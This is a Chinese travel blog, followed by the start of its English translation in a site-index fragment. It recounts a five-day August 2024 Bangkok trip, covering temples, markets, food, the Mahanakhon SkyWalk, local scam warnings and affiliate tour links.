臥佛寺、大皇宮、玉佛寺、鄭王廟、ICONSIAM、Lhao Lhao、Rock Pub Live飯店早餐早上吃完飯店早餐後出門，早餐我覺得還行，但選擇不多。9:30 出發因為人多就直接搭 Grab (THB 135) 直接前往臥佛寺。Photo by Florian Wehde中途有經過 唐人街 ，忘了拍照，很有賽博龐克感！ 👉👉👉 也可以考慮 KKday 的： 曼谷私人一日遊：臥佛寺、鄭王廟、大皇宮、玉佛寺泰國。臥佛寺門票：THB 300/人。臥佛寺裡的彩色舍利塔有一種說不出的壯觀感。 上次去日本九州也去 南藏院看臥佛 ，這次來看泰國的臥佛。 ⚠️人多地方，小心扒手⚠️進入需拖鞋、臥佛寺臥佛可以繞一圈參拜。SuperRich 換錢出臥佛寺之後想說先解決換錢問題，同行只有一位朋友有事先換一些泰銖，其他人都想說來曼谷再換；所以出來後就先走到附近的 The Old Siam Shopping Plaza⁩ 裡面的 SuperRich 換錢。⚠️請注意：要換的台幣不能有污漬、註記. .等等，否則會被拒絕兌換。(剛好有一張在台灣 ATM 領的千元大鈔上面有鉛筆註記被拒絕兌換) NTD $5,000 換到 THB $5,200Khanom bueang 泰式煎餅換完錢，有錢了，就在一樓的美食市集補充一下體能；吃了泰式煎餅 (ขนมเบื้อง) 甜的，裡面是蛋白霜吃起來很甜很像棉花糖、還有香蕉煎餅；最後買了一杯滿冰咖啡繼續前進。大皇宮、玉佛寺門票：THB 500/人。 👉👉👉KKday 有提供： 大皇宮和玉佛寺導覽之旅 (英語、泰語、中文、日語) ，想要更了解歷史的朋友可以考慮。一路走回大皇宮(玉佛寺在大皇宮內)，路上有很多政府機關的建築。大皇宮進入有服裝規定，要特別注意！ 不能穿短褲、露肩衣服、破洞牛仔褲、七分褲、短裙…等等 ⚠️人多地方，小心扒手⚠️夜叉門神夜叉和猴子樂達納舍利塔《拉瑪堅》壁畫圖片來源：Trueplookpanya ⚠️玉佛禁止拍照⚠️ 每個季節的服裝會有所不同，這次看到的是第二種服飾。大皇宮13:20 午餐時間大約來到 13 點多，出大皇宮後在附近往碼頭方向的西餐廳隨地解決午飯。14:00 準備搭船前往鄭王廟 ⚠️碼頭外邊會有人拉人問你去哪，要小心是私人船家，收費貴 (THB 500, 1000) 又不安全；無須理會，自己找到官方的碼頭、櫃檯跟他說你要去哪就好。⚠️ 官方的票價才 THB 30 ( Tha Chang 到 鄭王廟)，新的船有冷氣、安全又舒服。船到了，工作人員會喊到鄭王廟(沒錯就是中文)，不確定也可以隨時問。這時間快要下午後雷陣雨了，可以看得出來水流混濁湍急。船很新、冷氣很涼、封閉式的很安全、班次也蠻多的很方便！到站工作人員同樣會喊鄭王廟。14:30 抵達鄭王廟門票：THB 200下船後就是鄭王廟，可以直接排隊買票進入。 ⚠️鄭王廟同樣有服裝規定️⚠️ 不可以露肩、短褲、露肚、短裙。 可以穿泰服，很多人穿泰服來拍照。可以走到中間的平台拍照(⚠️樓梯很陡要小心)，很多人也會換泰服在此拍照留念。 👉👉👉 KKday 體驗推薦: - 曼谷鄭王廟攝影之旅的泰國服飾體驗 - 臥佛寺和鄭王廟 3 小時徒步導覽遊參觀完再回到碼頭先找到售票亭(PIER 2) 買前往 ICONSIAM 的船票 (THB 40)，再前往 PIER 1 搭乘。同樣也是舒服又安全的新船！15:00 ICONSIAMICONSIAM 很大，看起來也很奢華，一樓美食街很有特色。買一杯 ChaTraMue 手標泰奶補充體力。一路往後逛到 BTS Charoen Nakhon 月台，想說先去按個一小時腳底按摩。站外就有一家看起來比較新、大間的 (1) THAI GARDEN MASSAGE，問完沒位子；所幸繼續往前走到 (2) 另外一家，如圖位子的按摩店；我覺得也很舒服、人少、空間大、比較安靜，收費便宜 (腳/1小時/THB 270)。按完又有體力繼續逛街了，回到 ICONSIAM；一路走到樓上的餐廳，也是弄的很浮誇，有叢林、有小橋流水、有瀑布，整體很不錯！ 買了日本有名的薯條 TORO FRIES (排隊很長) 補充體力。 這邊也有日本的 % 咖啡。前往 LHAO LHAO 赴約吃飯這條是支線只有三站，班次比較少。 Google Map 好像沒有這條 BTS 的資訊，他是建議我用走的到 Krung Thon Buri。從這邊搭一站去 Krung Thon Buri 就是 Silom Line 了。曼谷也有 LAWSON!在 Siam 換 Sukhumvit Line 到 Ari 站下車走一小段就是 LHAO LHAO 餐廳了。19:00 LHAO LHAO老闆好像是華人(中國人)?，感覺像融合中式的泰式料理店，評價很高的老店，貌似也是 Blackpink LISA 愛店。因為等下要去 Pub 聽 Live 所以吃得比較趕，但每道菜我都覺得很好吃！！ 上圖1–3，鵝牌清涼膏的背景，像肉燥的那個，叫 หมูสับผัดหนำเลี้ยบ，好像是橄欖菜炒碎肉?，很下飯就是了！ 上圖2–1，炸蚵仔煎，類似台灣士林夜市的炸彈蚵仔煎 上圖2–2，季節限定飲品，龍眼茶 上圖2–3，最特別的咖哩螃蟹(Panang Curry)，是一整隻新鮮大螃蟹下去料理的 泰國人推薦的鵝牌清涼膏，我後來有買一罐聞起來比薄荷鼻通棒還順暢而且比較沒有鼻腔的刺激不適感！20:00 The Rock Pub吃飽後前往 The Rock Pub 喝酒、聽 Live。當天活動：https://www.instagram.com/p/C91ZVwtxR32/Rundown:• 20.00-21.00: A LIKELY LAD(Kings Of Leon/Blur/Arcade Fire and more)• 21.15-22.15: COUNTING DUCKS(Radiohead/The Strokes/The Killers and more)• 22.30-00.00 : THE CHOCOLATE COSMOS(Arctic Monkeys/Joy Division/The Cure/The Smiths and more)• 00.15-01.15: LIAM FT. HENSHIN(Oasis and more)價格：THB 350 附一杯飲料(酒)， 需提前買票預約 。 學到一個泰國冷知識：拍照不能拍酒標，因為會變有意鼓勵飲酒，所以要如圖 3 把酒標遮起來。四組表演，全都是搖滾、老歌經典！我聽過的有： Coldplay, Radiohead, Kings of Leon, Arcade Fire, Oasis, The Killers….我們大約聽到 23:00 時間太晚就先離開了，整場聽下來非常有水準！不管是唱功或是現場演唱的功力，我覺得很讚！很厲害！回飯店給 Chun-Hsiu Liu 台灣伴手禮之後解散回去休息了。8/04 Day 3 洽圖洽市集、王權瑪哈納功大廈、Central Rama 99:30 早餐：王春盛牛肉火鍋，牛雜火鍋吸貓體質，曼谷很多貓貓，馬上來蹭我一早坐 Grab 來 王春盛牛肉火鍋 吃早餐，整體味道蠻中/台式的，我覺得不錯，但台南牛肉湯更不錯。 吃完要去洽圖洽市集，洽圖洽的位置比較遠，懶得走路＋轉 BTS 去了，直接坐 Uber 前往 (THB 374)。 👉👉👉 KKday 恰圖恰市場 |曼谷私人接送服務10:45 抵達洽圖洽市集洽圖洽電子地圖 (chatuchak market map)點我洽圖洽整個範圍大、攤販密集，但整體乾淨好逛，但東西重複性質高，看起來很多就是賣觀光客的 Made In China 製品。最後只買了泰國品牌、泰國 Phutawan普妲旺 室內擴香，當紀念品。逛累了就走進裡面的按摩店腳底+一些肩頸按摩。(1 小時/THB 250)廁所洽圖洽如果要上廁所，市集外圍有付費廁所 (THB 5 一次)，我有進去上，很乾淨，一個人一格，基本上隨時都在打掃；不想付費上廁所也可以到外圍的 Mixt Chatuchak 商場，有免費、同樣乾淨的廁所。Mixt Chatuchak海鮮飯午餐也隨意在 Mixt Chatuchak 商場裡的餐廳隨便解決，味道還不錯。吃完繼續逛，買了一杯榴槤果汁來喝，味道很濃郁真實而且價格實惠 (THB 89)。 後來發現洽圖洽的東西其實比較便宜，例如薄荷鼻通棒這邊賣 6 支 $99，Big C 賣 6 支 $140…還有榴蓮果汁也是，市區夜市賣一杯 $140 多。15:00 搭 BTS 前往 王權瑪哈納功大廈洽圖洽離 MRT 比較近，但我們要去的王權大夏就在 BTS Chong Nonsi 站；從洽圖洽走到最近的 BTS Saphan Khwai 站大概要 1 KM (15 mins)。王權瑪哈納功大廈 (曼谷大京都大廈/King Power Mahanakhon)門票：THB 1,080/人 👉👉👉 推薦可以先從 KKday 買門票，價格較便宜：曼谷王權 Mahanakhon SkyWalk 觀景台門票 (2 天前可免費取消)近看沒有想像中高聳，但是建築風格很特別，比特賽博風。進去要先安全檢查，買完票會附送免費寄物，背包類不能攜帶上去(小腰包可以)。 搭電梯前可選擇要不要拍照 (門票含一系列免費合成的數位照片，如果要實體照片要再加錢)。免費合成的數位照片，參觀完電梯下來會有工作人員指引下載直達電梯跟台北 101、晴空塔一樣有 360 度場景動畫；高度上大約跟東京鐵塔差不多。電梯上來會先到 74 樓室內觀景台，這邊有一家咖啡廳跟公共座位可以稍做休息；要繼續轉乘電梯或走樓梯上到 78 樓才是頂樓戶外觀景台。78 樓一上來就有一家小的酒吧，也可以在這邊點一杯酒坐著觀賞景觀。出來 78 樓後可以繼續往上走來到階梯、頂樓休息區。頂樓可以環視整個曼谷，可以想像晚上的夜景應該也很美！階梯、頂樓休息區面對的就是有名的透明玻璃走廊，可以直接垂直看到地面，自己從旁邊箱子拿鞋套就可以進場、但 禁止攜待手機，可以請同行的人或工作人員協助拍照。整個玻璃走廊沒有很大，大概就像飯店的頂樓天際游泳池的大小而已，在旁邊看沒有覺得很高，實際走上去還是會怕，有點腳軟ＸＤ喬德夜市 (原拉差達火車夜)MRT 可以直接刷信用卡要到 Central Rama 9 需要轉搭 MRT 地下鐵到 帕藍9站，無法使用兔子卡，要買票或是現在可以用 VISA 卡直接刷卡進出。 實測台新 GoGo 卡可以，國泰 Cube 沒刷過。晚餐來這邊覓食，不得不說曼谷的夜市、市集贏台灣太多了，整體環境乾淨、有座位區、不會混亂、規劃良好，逛起來很舒服。逛了一圈先吃了左邊的甜點(類似雞蛋糕?)，跟右邊鹹的海鮮燒，吃起來是 QQ 的，都還不錯。再來是重頭戲火山排骨，味道蠻特別的，醬汁是香茅酸辣味道，直接套手套徒手抓起來啃，很開胃！吃完又在其他攤買了椰子冰淇淋+芒果+花生甜點，也好吃！吃完回 Central Rama 9 逛一下，這邊也有有名的 NaRaYa 曼谷包。回飯店的路上剛好遇到下完雨的曼谷配上五彩斑斕的數位廣告螢幕，色彩對比值直接拉滿，很有賽博龐克感。7–11 熱壓吐司宵夜回飯店路上去超商試了泰國的 超商熱壓吐司 還有泰國的香蕉牛奶，內餡是融化的起司熱狗，皮是酥皮！皮是酥皮！皮是酥皮！，很好吃而且便宜！8/05 Day 4 Central World、Big C、Terminal 21 整晚沒睡好＋整天宿醉，迷迷茫茫。Central World早上起來就出門到 Central World 逛街。一樓進來就有 SHAKE SHACK 漢堡，第一次吃直接點 SHAKE SHACK 招牌跟曼谷才有的椰奶口味奶昔，漢堡好吃不膩、奶昔我覺得太甜。裡面很大，跟 ICONSIAM 一樣樣要認真逛的話逛不完…走馬看花，隨手買了一件襯衫而已。Big CCentral World 逛完就走到對面 Big C 採買零食、伴手禮。(選項多但我覺得沒比較便宜…)左下 Phutawan普妲旺 室內擴香是昨天在洽圖洽買的，但我猜市區的百貨公司也有。另外 Big C 現在好像不提供塑膠袋，要自己在賣場裡買環保袋。 那個榴槤乾一大包，打開其實只有兩小包喔…不過蠻好吃的午餐Central World 外廣場有美食市集活動，不是單純搭搭棚子擺擺攤而已，他是有主體的，這次主題是鐵達尼號，只要追蹤他們官方的 Youtube 頻道就可以免費入場；裡面也佈置的很精緻。但午餐我們又跑去吃了一次 SHAKE SHACK，這次換吃雞腿肉漢堡，同樣好吃。下午：回飯店補眠，因為沒睡好＋宿醉…實在太累了晚餐 Terminal 21 航站百貨Terminal 21 也是要逛逛不完，每一層都有不同地區主題，例如日本就是主要賣日本的商品、餐廳。主要是跟 Chun-Hsiu Liu 約樓上美食街吃完餐。( 便宜又好吃，激推的覓食地點 )美食街這邊就自己找位子坐，很多當地人也會來吃。 ⚠️ 這邊的消費方式，店家不直接收錢，要先去櫃檯用現金換食物卡，憑食物卡 QRCode 結帳付款；吃完再回到櫃檯歸還、退款。(不需押金、手續費)選擇蠻多的，只要排隊、說你要的號碼、食物卡 QRCode 結帳即可；也可以外帶(我記得要多收 THB 10 包裝費)。點了海鮮炒泡麵(THB 50) + 豬排薯條 (THB 59) = THB 109吃完還外帶一盒芒果糯米飯當宵夜回飯店吃。真的很吃又便宜啊！！！前幾天吃外面餐廳一餐其實也要 200–300 起跳，這邊幾乎都是 THB 50~80 一餐。吃完跑去後面的 班嘉奇蒂公園 走走，順便找傳說中的 曼谷大蜥蜴 ；可能因為晚上的關係，一隻都沒看到。 ⚠️回飯店的路上遇上傳說中的外國人詐騙：⚠️ 在月台等 BTS 的時候… 看起像中東的人，上來搭訕 - 問你是不是泰國人、問你會不會英文、然後問你從哪裡來 - 我說 Taiwan - 他就負荷說 Oh. . Taiwan, I love Taiwan 但從他的發音就知道他根本不知道台灣… - 然後就說他要換錢但 SuperRich 關了，問我一百美金能換多少泰銖 我就覺得怪怪的了，直接不鳥他走人… 他們的手法都差不多，不然就是問你國家的貨幣長怎樣，他好奇可以給他看看嗎，然後趁你拿錢包的時候扒你的錢或是搶你的錢然後落跑。回飯店，同行友人有買山竹來品嚐，我覺得新鮮的好吃，淡淡的甜味加上山竹的味道，很順口，後來有吃山竹乾，味道就不怎麼樣，就乾乾酸酸的。 榴槤的部分，曼谷的榴蓮沒有比較便宜…一房也都 THB 200 – 300。8/06 Day 5 回程曼谷大蜥蜴早上不死心，特別去 倫批尼公園 找傳說中的曼谷大蜥蜴，因為時間不夠只找到一隻早上剛出來曬太陽的中型蜥蜴。 找大蜥蜴只是我個人無聊的行程，據說本地人很討厭這種蜥蜴(水巨蜥)，吃的東西也很髒，不要隨便接觸。12:00 回飯店拿行李前往機場15:20 的飛機，中午就要出發了，從市區到機場約需一個小時。 👉👉👉可以參考 KKday 機場接送服務： - 泰國｜機場包車接送｜素萬那普機場(BKK) / 廊曼機場 (DMK) — 曼谷/芭達雅/華欣市區飯店 - 曼谷機場接送｜曼谷市區私人包車至素萬那普機場(BKK)/廊曼機場(DMK)從飯店出發 Grab 車資：THB 577，需要上高速；司機會先代付過路費，最後 Grab 刷卡車資會再補上過路費。(我記得好像 THB 50)托運只能 15 kg，很克制的守住了。BKK 夜叉門神。出境完大約 13:20，曼谷機場檢查蠻嚴格的，所有東西都要過安檢，登機箱幾乎都要打開人工檢查。出境、安檢完，大概還有一小時可以吃東西；找了間泰式餐廳吃了泰國的最後一餐。(海鮮炒飯、芒果汁、芒果糯米飯)。 芒果糯米飯出境後很多店家都有賣外帶盒，吃不夠還可以買上飛機吃！ (⚠️但切記禁止帶回台灣⚠️)這瓶水質得給他一張特寫，因為廉航什麼都沒供應想說在機場買水上去喝，但是出境後的礦泉水一瓶都要 THB 70 — 100，這瓶要 THB 100。BKK 很大…滿滿的 Trip.com 廣告，回程沒有誤點時間到就搭接駁車去搭機了。回到台灣到 TPE 台灣桃園國際機場，領完行李出來後約 20:45，直接去搭 1841 or 1819 國光客運回台北，不需轉來轉去很方便～⚠️泰國曼谷旅遊安全及注意事項⚠️出門最重要的事就是安全，這邊統一整理安全及注意事項。防騙/防坑以下參考總結自曼谷貓大大的影片，我這次遇到的換/看錢詐騙就真的遇到了。 算錯帳不一定是故意，可以點餐的時候就算好總共金額 主動搭訕你想看你國家的貨幣或問你換錢等你把錢包掏出來時，偷或扒或搶 在大皇宮或景點外謊稱景點關門，熱心介紹你搭嘟嘟車去其他(黑寺廟/黑商店/ 坐私人遊船黑船，這次在碼頭有遇到 )地方騙你消費 嘟嘟車，漫天喊價、到一半突然加價如果想體驗嘟嘟車又怕被宰， 可以試試看新的 MUVMI app 嘟嘟車叫車 App 就算是看起來好的嘟嘟車，也要防範騙局 3，熱心介紹你去景點、坐船 假店員，在排隊候位時，會有假店員熱情招攬你們進去會用你的語言介紹餐點、幫你點餐，然後說要先結帳，拿了錢就跑了。 租機車、租摩托車騙局勿壓護照、勿壓護照、勿壓護照如果遇到惡意坑殺說損壞要你賠償的，壓護照就麻煩了或找大間的連鎖租賃商家、租車前也要先拍好車況影片 當地交友軟體騙局可能約到人妖、仙人跳、騙子 帕蓬乒乓秀騙局，路上熱情攬客問你要不要看乒乓 Show，只要點一杯 100 THB 酒就可以，然後帶你進暗巷、二樓黑店。很難看，要離開的時候跟你要 3,000 THB，說沒有 100 THB 這回事。 人多就要小心扒手，即使是在要買票才進去的地方 (e.g. 大皇宮、臥佛寺)🌿🚬明年就要禁止了，不過可以分享一下經驗。 ⚠️⚠️⚠️用吃的(軟糖之類)效果很強，而且可怕的是吃的時候真的就跟一般軟糖一樣毫無感覺，會在幾個小時後突然衝起來發作⚠️⚠️⚠️ 最好漸進式嘗試，吃 1/3 . .等幾小時. .沒事、再吃 2/3 . .等幾小時. .有一點感覺、再試試看吃 1 顆… 抽的也是看體質最好也是漸進式 ⚠️⚠️⚠️不管怎樣強烈建議都在飯店內嘗試，如果茫了可以直接休息，比較安全⚠️⚠️⚠️ 會喝酒不代表比較耐受 ⚠️⚠️⚠️ 心跳會加速不舒服 ⚠️⚠️⚠️ 需要有一個人是醒著，有事能照顧，比較安全 只有在特定場合可以抽其他 泰國不是小費文化的國家，一般來說不用給；我只有按摩才會給 THB 20 小費意思意思一下。 會賣酒的時間只有 11:00~14:00、17:00~24:00，佛教節日全天禁止賣酒 飯店陽台不一定能吸菸，要問 外國人專用外國語緊急救助電話撥 1155 SuperRich 是有營業時間的，如果太早或太晚到就沒辦法換到錢附錄 — 2018 數字科技 曼谷華新 5日員工旅遊 純回憶跟一些行程給大家參考，細節不可考。數字科技 2018 年員工旅遊 ⚠️以下都是 2018 的照片跟紀錄，僅供參考⚠️ ⚠️以下都是 2018 的照片跟紀錄，僅供參考⚠️ ⚠️以下都是 2018 的照片跟紀錄，僅供參考⚠️Day1復活島摩艾巨石像咖啡館 Moai Cafe (已停業)同事(2024)也有說，曼谷有很多很多網美咖啡廳，都很浮誇，有興趣的朋友可以查查看，這家評價不高而且已歇業。晚餐 — Chom View Seafood 海景海鮮餐廳住 2 晚 — SHERATON HUA HIN RESORT &amp; SPA 華新喜來登Source: SHERATON HUA HIN RESORT &amp; SPA飯店照片沒拍幾張，只拍了一張早上醒來發現被子裡有一隻大馬陸的驚嚇照。Day 2Santorini Park 希臘風情小鎮 (已停業)【華欣七岩景點】聖托里尼遊樂園：超好拍照的泰國小希臘 | BringYou 曼谷往華欣路上必經的七岩地區，有個希臘風濃厚的「聖托里尼遊樂園」，是泰國人週末放假散步闔家歡樂的景點，喜歡拍照的話，非常推薦進來這個浪漫無比的樂園走走。 www.bring-you.info好像是個小樂園、跟百貨公司，希臘造景。華新藝術村 Hua Hin Artist Village蠻有名的景點，2024 還有營業。有很多畫作、藝術品。回喜來登飯店享受設施、海灘飯店是 Villa 形式，每間都是獨棟，游泳池可以環繞整個飯店的每間房間，泳池旁就有酒吧；外面沙灘是未開發地區，一片荒蕪。晚上吃完飯點自助餐，去附近夜市逛逛。Day 3美功鐵道市場時間太早，大家放棄不去。丹嫩莎朵水上市場 👉👉👉 這兩個景點交通不方便，可參考 KKday 行程： - 曼谷經典一日遊｜美功鐵路和丹嫩莎朵水上市場 | 曼谷出發 -【泰國】曼谷包車半日遊｜美功鐵道市場 — 安帕瓦水上市場 — 安帕瓦螢火蟲遊河記得蠻刺激、有探險的感覺，雖然水很混濁跟有味道。前往曼谷 入住(2日) 皇后公園萬豪酒店 MARRIOTT QUEENS PARK BANGKOKHEALTH LAND 2 小時全身泰式按摩導遊特別跟店家說不踩背，只記得很高級，但是邊按會痛睡不著ＸＤRiver City Shopping Complex因為晚上要去昭披耶公主號郵輪+自助晚餐，所以先來到碼頭附近的百貨公司逛街。昭披耶公主號郵輪自助晚餐 👉👉👉 需要提前預訂，可以參考 KKday 的 昭披耶公主號郵輪自助晚餐｜Chao Phraya Princess River Cruise 。吃的我記得還行，主要是夜景很美，可以看到曼谷 河濱夜市摩天輪 的燈火。回飯店後到萬豪樓上的酒吧小酌，只記得夜景漂亮、酒便宜。Day 4 自由行只記得有去逛百貨公司、Big C、Central World。晚上去 曼谷薩通JC凱文酒店 Zoom Sky Bar 小酌 就是我這次去住的飯店ＸＤDay 5 回程以上就是 2018 員工旅遊的記憶，這次全自由行重返曼谷，讓我更熟悉了這個城市，相較之前來的印象我覺得比之前更繁華、東西更好吃、物價也比之前貴了。— — —香港人既Party Room / BBQ場平台 — Common Room預約平台Common Room無論你是想找個Party Room慶祝、還是要日租酒店/賓館短住，你都可以使用 Common Room平台，輕鬆去尋找你的心儀場地！現在更可以預約香港的船P呀。有要去香港旅遊的朋友，想嘗試不同場地的體驗，可以立即前往看看： Common Room 預約平台 。— — —👉👉👉KKday 方案推薦： 昭披耶公主號郵輪自助晚餐｜Chao Phraya Princess River Cruise 曼谷經典一日遊｜美功鐵路和丹嫩莎朵水上市場 | 曼谷出發 【泰國】曼谷包車半日遊｜美功鐵道市場 — 安帕瓦水上市場 — 安帕瓦螢火蟲遊河 曼谷王權 Mahanakhon SkyWalk 觀景台門票 泰國機場 BKK 出境 meet and greet 快速尊榮接待服務 泰國網卡｜AIS 5G高速網路 8日 無限流量+通話 eSIM 泰國｜機場包車接送｜素萬那普機場(BKK) / 廊曼機場 (DMK) — 曼谷/芭達雅/華欣市區飯店 曼谷機場接送｜曼谷市區私人包車至素萬那普機場(BKK)/廊曼機場(DMK) 如果這篇文章對您有幫助，歡迎使用我的 推廣連結 選購 KKday 商品、行程，我將獲得部分收益，持續更多旅遊創作，謝謝。更多遊記 [遊記] 2025 韓國釜山 8 天 7 夜自由行 [遊記] 2024 山陰廣域地區(上篇) 島根 出雲 松江 鳥取 姬路 大阪 神戶 7 日獨旅自由行 [遊記] 2024 山陰廣域地區(下篇) 島根 出雲 松江 鳥取 姬路 大阪 神戶 7 日獨旅自由行 [遊記] 2024 二訪九州 9 日自由行，經釜山→博多郵輪入境 [遊記] 2023 九州 10 日自由行獨旅 [遊記] 2023 廣島岡山 6 日自由行 [遊記] 9/11 名古屋一日快閃 [遊記] 2023 東京 5 日自由行 [遊記] 2023 京阪神 8 日自由行有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.如果這篇文章對您有幫助，歡迎使用我的 推廣連結 選購 KKday 商品、行程，我將獲得部分收益，持續更多旅遊創作，謝謝： Follow Me on Medium 1K+ Followers 1,361 Total Views Last Statistics Date: 2025-08-15 | 1,247 Views on Medium." }, { "title": "Travel Diary 2024 Bangkok, Thailand 🇹🇭 5-Day Free Trip", "url": "/posts/travel-diaries/en/travel-diary-2024-bangkok-thailand-5-day-free-trip-b7e7c0938985/", "categories": "Travel Diaries", "tags": "Lifestyle, travel, travel-writing, bangkok, thailand", "date": "2024-08-25 01:23:20 +0800", "snippet": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版[Travel Diary] 2024 Bangkok, Thailand 🇹🇭 5-Day Free TripA quick five-day trip to Ban...", "content": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版[Travel Diary] 2024 Bangkok, Thailand 🇹🇭 5-Day Free TripA quick five-day trip to Bangkok, Thailand after the pandemic.Memories of BangkokLet’s rewind to 2018, my first job and my first company trip, which was also my first time traveling abroad, to Bangkok, Thailand (5 days); the following year in 2019, I went to Sabah with the company again; then came the two years stolen by the pandemic, and after it ended, I started going crazy with trips to Japan.Back then, I was a complete novice with zero social experience, blindly following my older siblings on outings. I didn’t even know what I could or couldn’t bring on a plane. At security, I clumsily placed my passport in the basket, only to find it had fallen onto the conveyor belt when I exited the machine, nearly giving me a heart attack (if it had fallen into the gap, I wouldn’t have been able to come back). That trip was a mindless group tour, and I don’t have a clear impression of Bangkok; I only remember the rooftop bars were great, the weather was hot, things were cheap, and massages were affordable, and that’s about it. I had no concept of the geography.So, I always thought about returning to Bangkok to revisit the old places and fill in the memories from six years ago. However, I wasn’t familiar with Southeast Asia and was hesitant to travel alone. It just so happened that at the beginning of the year, while chatting with colleagues from Pinkoi, we decided to plan this five-day free trip to Bangkok. The details and fragments of memories from the 2018 Bangkok + Hua Hin five-day trip are included in the appendix at the end of the article.Preparation!👉👉👉 Recommended KKday Packages: Chao Phraya Princess River Cruise Dinner Buffet Bangkok Classic Day Tour | Maeklong Railway and Damnoen Saduak Floating Market | Departing from Bangkok Bangkok Private Half-Day Tour | Maeklong Railway Market \\— Amphawa Floating Market \\— Amphawa Firefly Night Cruise King Power Mahanakhon SkyWalk Observation Deck Ticket Thailand Airport BKK Departure Meet and Greet Fast Track Service Thailand SIM Card | AIS 5G High-Speed Internet 8 Days Unlimited Data + Calls eSIM Thailand | Airport Private Transfer | Suvarnabhumi Airport (BKK) \\/ Don Mueang Airport (DMK) \\— Bangkok\\/Pattaya\\/Hua Hin City Hotels Bangkok Airport Transfer | Private Car from Bangkok City to Suvarnabhumi Airport (BKK)\\/Don Mueang Airport (DMK)— — —Since I started a new job in June, I wasn’t really focused on leisure, and mainly Mark and Sean were responsible for the arrangements and planning; I didn’t do much research. ⚠️⚠️⚠️ I’ve included travel safety tips and precautions for Bangkok, Thailand at the end of the travel diary. You can skip the diary but be sure to understand the scams and precautions, especially if you want to avoid trouble with marijuana.Itinerary 2024/08/02 ~ 2024/08/06 Day 1 08/02: Expected arrival at Bangkok Airport at 18:45, check into the hotel around 20:00, then rest at the hotel or visit the hotel bar. Day 2 08/03: Chao Phraya River attractions, Grand Palace, Wat Pho, Wat Phra Kaew, Wat Arun, ICONSIAM, and in the evening, meet the top digital technology guy Chun-Hsiu Liu at Lhao Lhao for dinner and listen to Rock Pub Live. Day 3 08/04: Chatuchak Market, King Power Mahanakhon Tower, and Talad Neon Night Market (Volcano Ribs). Day 4 08/05: Shopping at Central World and Terminal 21. Day 5 08/06: Return trip, Flight at 15:20.InternetThis time, the preparation was rushed, and I hadn’t arranged for internet access the day before, nor did I have time to buy my usual physical SIM card. Fortunately, I tried eSIM for the first time. (I fell in love with it!) I directly purchased the [**Thailand SIM Card AIS 5G High-Speed Internet 8 Days Unlimited Data + Calls eSIM**](https://www.kkday.com/zh-tw/product/137037-ais-16-day-unlimited-data-esim-activate-before-may-3-2023-thailand?cid=19365){:target=”_blank”} on KKday, and after purchasing, I received the eSIM activation certificate immediately, so I could use it right away. ![[Thailand SIM Card AIS 5G High-Speed Internet 8 Days Unlimited Data + Calls eSIM](https://www.kkday.com/zh-tw/product/137037-ais-16-day-unlimited-data-esim-activate-before-may-3-2023-thailand?cid=19365){:target=”_blank”}](/assets/b7e7c0938985/1*AnowISXXahXxykkUUsugFw.webp){: lqip=”data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMTAzIiBoZWlnaHQ9IjMzNSI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==” } Thailand SIM Card | AIS 5G High-Speed Internet 8 Days Unlimited Data + Calls eSIM Limited-time promotional offer: From now until December 31, 2024, activating during the promotional period allows you to enjoy high-speed data of 15GB doubled to 30GB. After exceeding 30GB, the speed will drop to 384 Kbps, but you will remain connected. Unlimited calls within AIS network, and a 50 THB call allowance. When using the following apps to send text messages, you can use an additional 10GB of data (10Mbps): TikTok, WeChat, and Instagram. Has a physical number, can make calls, and receive text messages! Calculation of days: 24-hour system, starts counting from eSIM activation, with 24 hours considered one day (Thailand time).Mainly an all-you-can-eat option, cheaper than a physical SIM card, 8 days for NT $232.Flight Tickets 🛫 Outbound: TPE 16:00 -&gt; BKK 18:45 Return: BKK 15:20 -&gt; TPE 20:10Airline: Thai VietJet Air (Low-cost airline)Price: TWD $9,259 (including the additional round-trip 15 kg checked baggage)Initially, I thought about traveling with everyone, and my friend didn’t check in luggage (the ticket price was around $6,000), but later I checked other airlines and felt I missed out; other airlines were about $10,000 for similar times, not much difference, but much more comfortable!Thai VietJet Air’s baggage policy allows you not to check in luggage; you can carry two pieces of hand luggage, with a total weight not exceeding 7 kg.1. Hand luggage weight:Each passenger (except infants) can bring 1 piece of their own luggage and 1 small hand luggage, with a maximum total weight not exceeding 7 kg.2. Hand luggage dimensions:- 01 piece with maximum dimensions of 56cm x 36cm x 23cm for hand luggage.- 01 piece of small hand luggage (including the following bags): + 01 girl's bag, magazines, camera, baby food bag, and bags purchased at the airport not exceeding 30cm x 20cm x 10cm. + 01 bag for a jacket that, when opened, does not exceed 114cm x 60cm x 11cm. + 01 bag for a laptop with maximum dimensions of 40cm x 30cm x 10cm. Information as of 2024/08/22, everything is subject to the latest official announcements.Basically, just carry a backpack and drag a carry-on suitcase.Flight Change Notification on 8/1Received a flight change notification email around 11 PM on 8/1, rescheduling the departure to 16:35 and arrival at 19:20.AccommodationJC KEVIN SATHORN BANGKOK HOTEL36 Narathiwas-Ratchanakarin Road, Yannawa, Sathorn, Bangkok, Thailand, 10120 Room Type: Skyline 2-Bedroom Suite with Balcony, with an unboxing video available. Transportation: According to the map, the nearest BTS station, Chong Nonsi, is about 1 km away, approximately a 15-minute walk. Price: NT 31,315 / 4 people / 4 nights. (It was expensive because I booked too late; earlier bookings could get 40-50% off.)CurrencyMy travel companions exchanged 3,000 THB in advance, while I exchanged at SuperRich upon arrival.TransportationI registered for Grab in Taiwan and linked my credit card for easy use.Taiwanese SouvenirsPrepared some Taiwanese snacks for the top Agoda guy. HeySong Sarsaparilla, Milk Tea, Vita Lemon Tea, I-Mei Cream Puffs, Shrimp Chips, Wei-Li Fried Noodles, Pineapple Cake, Potato Chips, and Cola Nuts.Common Room — Party Room / BBQ Venue Booking PlatformBefore starting the travel diary, let me introduce a recently launched day rental/hourly rental hotel and Party Room booking platform — Common Room.Common RoomWhether you’re looking for a party room to celebrate or a day rental hotel/inn for a short stay, you can use the Common Room platform to easily find your desired 